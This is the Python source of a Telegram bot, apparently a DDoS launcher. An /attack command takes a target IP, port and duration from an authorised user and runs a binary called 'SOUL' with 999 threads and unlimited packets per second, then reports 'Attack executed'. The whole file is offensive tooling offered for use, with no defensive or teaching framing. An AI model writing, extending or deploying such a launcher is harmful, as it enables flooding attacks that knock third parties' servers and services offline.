import os
import subprocess
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import config  # BOT_TOKEN and USER_ID

# Authorized user list
AUTHORIZED_USERS = [str(config.USER_ID)]

# Maximum SOUL settings
MAX_THREADS = "999"
MAX_PPS = "-1"  # unlimited packets per second

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚡ Welcome! Use /attack <IP> <PORT> <DURATION> to run SOUL with max threads and PPS."
    )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id not in AUTHORIZED_USERS:
        await update.message.reply_text("❌ You are not authorized to run commands.")
        return

    args = context.args
    if len(args) != 3:
        await update.message.reply_text(
            "Usage: /attack <IP> <PORT> <DURATION>"
        )
        return

    ip, port, duration = args

    try:
        # Make SOUL executable
        os.chmod("./SOUL", 0o755)

        # Run SOUL binary with max threads and PPS
        result = subprocess.run(
            ["./SOUL", ip, str(port), str(duration), MAX_THREADS, MAX_PPS],
            capture_output=True,
            text=True
        )

        output = result.stdout
        error = result.stderr

        response = f"✅ Attack executed.\n\nOutput:\n{output}\nError:\n{error}"
        await update.message.reply_text(response)

    except Exception as e:
        await update.message.reply_text(f"❌ Failed to run SOUL: {str(e)}")

if __name__ == "__main__":
    app = ApplicationBuilder().token(config.BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))

    print("Spike bot is running...")
    app.run_polling()
